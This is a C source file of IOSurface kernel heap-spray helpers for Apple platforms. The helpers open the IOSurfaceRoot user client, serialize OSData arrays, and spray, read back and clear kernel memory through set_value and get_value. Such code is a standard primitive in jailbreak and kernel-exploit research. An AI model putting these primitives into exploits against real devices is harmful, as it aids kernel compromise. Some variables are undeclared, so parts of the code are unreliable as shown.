#include "iosurface.h"

io_connect_t get_iosurface_root_uc(void) {
    kern_return_t ret;
    io_connect_t shared_user_client_conn = MACH_PORT_NULL;
    int type = 0;
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                       IOServiceMatching("IOSurfaceRoot"));
    
    if(service == MACH_PORT_NULL) {
        printf("failed to open service\n");
        return MACH_PORT_NULL;
    }
    
    ret = IOServiceOpen(service, mach_task_self(), type, &shared_user_client_conn);
    if(ret != KERN_SUCCESS) {
        printf("[-] failed to open userclient: %s\n", mach_error_string(ret));
        return MACH_PORT_NULL;
    }
    
    return shared_user_client_conn;
}

int create_surface(io_connect_t iosurface_uc) {
    kern_return_t ret;
    uint64_t scalars[1] = { 0x0 };
    
    char output_struct[0xf60];
    memset(output_struct, 0x0, sizeof(output_struct));
    size_t output_struct_size = sizeof(output_struct);

    char create_dict[] = "<dict><key>IOSurfaceHeight</key><integer ID=\"0\" size=\"32\">0x8</integer><key>IOSurfaceWidth</key><integer IDREF=\"0\"/></dict>";

    // call s_create_surface
    ret = IOConnectCallMethod(iosurface_uc, 0,
                                    scalars, 1,
                                    create_dict, strlen(create_dict)+1,
                                    NULL, NULL,
                                    output_struct, &output_struct_size);
    
    if (ret != KERN_SUCCESS) {
        printf("s_create_surface failed: %s\n", mach_error_string(ret));
        return 0;
    }
    
    int surface_id = *(int*)(output_struct+0x18);
    return surface_id;
}

bool release_surface(io_connect_t iosurface_uc, int surface_id) {
    kern_return_t ret;
    
    uint64_t scalars[1] = { 0x0 };
    scalars[0] = (uint64_t)surface_id;

    // call s_release_surface
    ret = IOConnectCallMethod(iosurface_uc, 1,
                                    scalars, 1,
                                    NULL, 0,
                                    NULL, NULL,
                                    NULL, NULL);
    
    if (ret != KERN_SUCCESS) {
        printf("s_release_surface failed: %s\n", mach_error_string(ret));
        return false;
    }

    return true;
}

/*
 * IOSurface_set_value
 *
 * Description:
 *     A wrapper around IOSurfaceRootUserClient::set_value().
 */
static bool
IOSurface_set_value(io_connect_t iosurface_uc, const struct IOSurfaceValueArgs *args, size_t args_size) {
    struct IOSurfaceValueResultArgs result;
    size_t result_size = sizeof(result);
    kern_return_t kr = IOConnectCallMethod(
            iosurface_uc,
            9, // set_value
            NULL, 0,
            args, args_size,
            NULL, NULL,
            &result, &result_size);
    if (kr != KERN_SUCCESS) {
        printf("failed to %s value in %s: 0x%x", "set", "IOSurface", kr);
        return false;
    }
    return true;
}

/*
 * IOSurface_get_value
 *
 * Description:
 *     A wrapper around IOSurfaceRootUserClient::get_value().
 */
static bool
IOSurface_get_value(io_connect_t iosurface_uc, const struct IOSurfaceValueArgs *in, size_t in_size,
        struct IOSurfaceValueArgs *out, size_t *out_size) {
    kern_return_t kr = IOConnectCallMethod(
            iosurface_uc,
            10, // get_value
            NULL, 0,
            in, in_size,
            NULL, NULL,
            out, out_size);
    if (kr != KERN_SUCCESS) {
        printf("failed to %s value in %s: 0x%x", "get", "IOSurface", kr);
        return false;
    }
    return true;
}

/*
 * IOSurface_remove_value
 *
 * Description:
 *     A wrapper around IOSurfaceRootUserClient::remove_value().
 */
static bool
IOSurface_remove_value(io_connect_t iosurface_uc, const struct IOSurfaceValueArgs *args, size_t args_size) {
    struct IOSurfaceValueResultArgs result;
    size_t result_size = sizeof(result);
    kern_return_t kr = IOConnectCallMethod(
            iosurface_uc,
            11, // remove_value
            NULL, 0,
            args, args_size,
            NULL, NULL,
            &result, &result_size);
    if (kr != KERN_SUCCESS) {
        printf("failed to %s value in %s: 0x%x", "remove", "IOSurface", kr);
        return false;
    }
    return true;
}

/*
 * base255_encode
 *
 * Description:
 *     Encode an integer so that it does not contain any null bytes.
 */
static uint32_t
base255_encode(uint32_t value) {
    uint32_t encoded = 0;
    for (unsigned i = 0; i < sizeof(value); i++) {
        encoded |= ((value % 255) + 1) << (8 * i);
        value /= 255;
    }
    return encoded;
}

/*
 * xml_units_for_data_size
 *
 * Description:
 *     Return the number of XML units needed to store the given size of data in an OSString.
 */
static size_t
xml_units_for_data_size(size_t data_size) {
    return ((data_size - 1) + sizeof(uint32_t) - 1) / sizeof(uint32_t);
}

/*
 * serialize_IOSurface_data_array
 *
 * Description:
 *     Create the template of the serialized array to pass to IOSurfaceUserClient::set_value().
 *     Returns the size of the serialized data in bytes.
 */
static size_t
serialize_IOSurface_data_array(uint32_t *xml0, uint32_t array_length, uint32_t data_size,
        uint32_t **xml_data, uint32_t **key) {
    uint32_t *xml = xml0;
    *xml++ = kOSSerializeBinarySignature;
    *xml++ = kOSSerializeArray | 2 | kOSSerializeEndCollection;
    *xml++ = kOSSerializeArray | array_length;
    for (size_t i = 0; i < array_length; i++) {
        uint32_t flags = (i == array_length - 1 ? kOSSerializeEndCollection : 0);
        *xml++ = kOSSerializeData | (data_size - 1) | flags;
        xml_data[i] = xml;
        xml += xml_units_for_data_size(data_size);
    }
    *xml++ = kOSSerializeSymbol | sizeof(uint32_t) + 1 | kOSSerializeEndCollection;
    *key = xml++;        // This will be filled in on each array loop.
    *xml++ = 0;        // Null-terminate the symbol.
    return (xml - xml0) * sizeof(*xml);
}

/*
 * IOSurface_spray_with_gc_internal
 *
 * Description:
 *     A generalized version of IOSurface_spray_with_gc() and IOSurface_spray_size_with_gc().
 */


static bool
IOSurface_spray_with_gc_internal(io_connect_t iosurface_uc, int surface_id, uint32_t array_count, uint32_t array_length, uint32_t extra_count,
        void *data, uint32_t data_size,
        void (^callback)(uint32_t array_id, uint32_t data_id, void *data, size_t size)) {
    assert(array_count <= 0xffffff);
    assert(array_length <= 0xffff);
    assert(data_size <= 0xffffff);
    assert(extra_count < array_count);
    // Make sure our IOSurface is initialized.
    
    // How big will our OSUnserializeBinary dictionary be?
    uint32_t current_array_length = array_length + (extra_count > 0 ? 1 : 0);
    size_t xml_units_per_data = xml_units_for_data_size(data_size);
    size_t xml_units = 1 + 1 + 1 + (1 + xml_units_per_data) * current_array_length + 1 + 1 + 1;
    // Allocate the args struct.
    struct IOSurfaceValueArgs *args;
    size_t args_size = sizeof(*args) + xml_units * sizeof(args->xml[0]);
    args = malloc(args_size);
    assert(args != 0);
    // Build the IOSurfaceValueArgs.
    args->surface_id = surface_id;
    // Create the serialized OSArray. We'll remember the locations we need to fill in with our
    // data as well as the slot we need to set our key.
    uint32_t **xml_data = malloc(current_array_length * sizeof(*xml_data));
    assert(xml_data != NULL);
    uint32_t *key;
    size_t xml_size = serialize_IOSurface_data_array(args->xml,
            current_array_length, data_size, xml_data, &key);
    assert(xml_size == xml_units * sizeof(args->xml[0]));
    // Keep track of when we need to do GC.
    size_t sprayed = 0;
    size_t next_gc_step = 0;
    // Loop through the arrays.
    for (uint32_t array_id = 0; array_id < array_count; array_id++) {
        // If we've crossed the GC sleep boundary, sleep for a bit and schedule the
        // next one.
        // Now build the array and its elements.
        *key = base255_encode(total_arrays + array_id);
        for (uint32_t data_id = 0; data_id < current_array_length; data_id++) {
            // Update the data for this spray if the user requested.
            if (callback != NULL) {
                callback(array_id, data_id, data, data_size);
            }
            // Copy in the data to the appropriate slot.
            memcpy(xml_data[data_id], data, data_size - 1);
        }
        // Finally set the array in the surface.
        bool ok = IOSurface_set_value(iosurface_uc, args, args_size);
        if (!ok) {
            free(args);
            free(xml_data);
            return false;
        }
        if (ok) {
            sprayed += data_size * current_array_length;
            // If we just sprayed an array with an extra element, decrement the
            // outstanding extra_count.
            if (current_array_length > array_length) {
                assert(extra_count > 0);
                extra_count--;
                // If our extra_count is now 0, rebuild our serialized array. (We
                // could implement this as a memmove(), but I'm lazy.)
                if (extra_count == 0) {
                    current_array_length--;
                    serialize_IOSurface_data_array(args->xml,
                            current_array_length, data_size,
                            xml_data, &key);
                }
            }
        }
    }
    if (next_gc_step > 0) {
        // printf("\n");
    }
    // Clean up resources.
    free(args);
    free(xml_data);
    total_arrays += array_count;
    return true;
}

bool
IOSurface_spray_with_gc(io_connect_t iosurface_uc, int surface_id, uint32_t array_count, uint32_t array_length,
        void *data, uint32_t data_size,
        void (^callback)(uint32_t array_id, uint32_t data_id, void *data, size_t size)) {
    return IOSurface_spray_with_gc_internal(iosurface_uc, surface_id, array_count, array_length, 0,
            data, data_size, callback);
}

bool
IOSurface_spray_size_with_gc(io_connect_t iosurface_uc, int surface_id, uint32_t array_count, size_t spray_size,
        void *data, uint32_t data_size,
        void (^callback)(uint32_t array_id, uint32_t data_id, void *data, size_t size)) {
    assert(array_count <= 0xffffff);
    assert(data_size <= 0xffffff);
    size_t data_count = (spray_size + data_size - 1) / data_size;
    size_t array_length = data_count / array_count;
    size_t extra_count = data_count % array_count;
    assert(array_length <= 0xffff);
    return IOSurface_spray_with_gc_internal(iosurface_uc, surface_id, array_count, (uint32_t) array_length,
            (uint32_t) extra_count, data, data_size, callback);
}

bool
IOSurface_spray_read_array(io_connect_t iosurface_uc, int surface_id, uint32_t array_id, uint32_t array_length, uint32_t data_size,
        void (^callback)(uint32_t data_id, void *data, size_t size)) {
    assert(array_id < 0xffffff);
    assert(array_length <= 0xffff);
    assert(data_size <= 0xffffff);
    bool success = false;
    // Create the input args.
    struct IOSurfaceValueArgs_string args_in = {};
    args_in.surface_id = surface_id;
    args_in.string_data = base255_encode(array_id);
    // Create the output args.
    size_t xml_units_per_data = xml_units_for_data_size(data_size);
    size_t xml_units = 1 + 1 + (1 + xml_units_per_data) * array_length;
    struct IOSurfaceValueArgs *args_out;
    size_t args_out_size = sizeof(*args_out) + xml_units * sizeof(args_out->xml[0]);
    // Over-allocate the output buffer a little bit. This allows us to directly pass the inline
    // data to the client without having to worry about the fact that the kernel data is 1 byte
    // shorter (which otherwise would produce an out-of-bounds read on the last element for
    // certain data sizes). Yeah, it's a hack, deal with it.
    args_out = malloc(args_out_size + sizeof(uint32_t));
    assert(args_out != 0);
    // Get the value.
    bool ok = IOSurface_get_value(iosurface_uc, (struct IOSurfaceValueArgs *)&args_in, sizeof(args_in),
            args_out, &args_out_size);
    if (!ok) {
        goto fail;
    }
    // Do the ugly parsing ourselves. :(
    uint32_t *xml = args_out->xml;
    if (*xml++ != kOSSerializeBinarySignature) {
        printf("did not find OSSerializeBinary signature");
        goto fail;
    }
    if (*xml++ != (kOSSerializeArray | array_length | kOSSerializeEndCollection)) {
        printf("unexpected container");
        goto fail;
    }
    for (uint32_t data_id = 0; data_id < array_length; data_id++) {
        uint32_t flags = (data_id == array_length - 1 ? kOSSerializeEndCollection : 0);
        if (*xml++ != (kOSSerializeString | data_size - 1 | flags)) {
            printf("unexpected data: 0x%x != 0x%x at index %u",
                    xml[-1], kOSSerializeString | data_size - 1 | flags,
                    data_id);
            goto fail;
        }
        callback(data_id, (void *)xml, data_size);
        xml += xml_units_per_data;
    }
    success = true;
fail:
    free(args_out);
    return success;
}

bool
IOSurface_spray_read_all_data(io_connect_t iosurface_uc, int surface_id, int32_t array_count, uint32_t array_length, uint32_t data_size,
        void (^callback)(uint32_t array_id, uint32_t data_id, void *data, size_t size)) {
    assert(array_count <= 0xffffff);
    assert(array_length <= 0xffff);
    assert(data_size <= 0xffffff);
    bool ok = true;
    //TODO: We should probably amortize the creation of the output buffer.
    for (uint32_t array_id = 0; array_id < array_count; array_id++) {
        ok &= IOSurface_spray_read_array(iosurface_uc, surface_id, array_id, array_length, data_size,
                ^(uint32_t data_id, void *data, size_t size) {
            callback(array_id, data_id, data, size);
        });
    }
    return ok;
}

bool
IOSurface_spray_remove_array(io_connect_t iosurface_uc, int surface_id, uint32_t array_id) {
    assert(array_id < 0xffffff);
    struct IOSurfaceValueArgs_string args = {};
    args.surface_id = surface_id;
    args.string_data = base255_encode(array_id);
    return IOSurface_remove_value(iosurface_uc, (struct IOSurfaceValueArgs *)&args, sizeof(args));
}

bool
IOSurface_spray_clear(io_connect_t iosurface_uc, int surface_id, uint32_t array_count) {
    assert(array_count <= 0xffffff);
    bool ok = true;
    for (uint32_t array_id = 0; array_id < array_count; array_id++) {
        ok &= IOSurface_spray_remove_array(iosurface_uc, surface_id, array_id);
    }
    return ok;
}
